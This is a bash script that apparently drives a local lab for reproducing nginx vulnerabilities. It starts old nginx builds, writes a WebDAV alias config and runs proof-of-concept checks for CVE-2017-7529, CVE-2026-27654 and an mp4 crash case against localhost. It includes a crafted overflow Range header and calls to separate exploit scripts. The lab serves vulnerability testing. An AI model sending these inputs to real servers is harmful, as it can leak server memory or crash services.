#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
stop(){ pkill -f "$LAB/nginx-" 2>/dev/null||true; pkill -f backend-7529.py 2>/dev/null||true; sleep 1; }

cat >"$LAB/conf/27654.conf" <<EOF
worker_processes 1;
error_log $LAB/27654-error.log info;
pid $LAB/27654.pid;
events { worker_connections 64; }
http {
    server {
        listen 27654;
        client_max_body_size 1m;
        location /uploads/ {
            alias /tmp/files123/;
            dav_methods PUT DELETE MKCOL COPY MOVE;
            create_full_put_path on;
        }
    }
}
EOF
mkdir -p /tmp/files123

echo "===41741 manual start=0==="
stop
"$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
curl -s -o /dev/null -w "code=%{http_code}\n" "http://127.0.0.1:41741/evil2.mp4?start=0" || echo "curl_fail connection_reset"
sleep 1
if ! curl -s --max-time 2 http://127.0.0.1:41741/ >/dev/null; then echo "nginx_down"; E41741=0; else echo "nginx_alive"; E41741=1; fi
tail -5 "$LAB/41741-error.log"
stop

echo "===27654 /tmp/files123 alias len13==="
"$LAB/nginx-1.29.6/sbin/nginx" -c "$LAB/conf/27654.conf"
python3 "$POCLAB/pocs/CVE-2026-27654/poc.py" "http://127.0.0.1:27654"
E27654=$?
echo "27654=$E27654"
tail -10 "$LAB/27654-error.log" 2>/dev/null
stop

echo "===7529 range status==="
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s http://127.0.0.1:17529/ >/dev/null
curl -s -o /dev/null -w "range_code=%{http_code}\n" -H "Range: bytes=-652,-9223372036854774780" http://127.0.0.1:17529/
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
echo "7529=$?"
stop
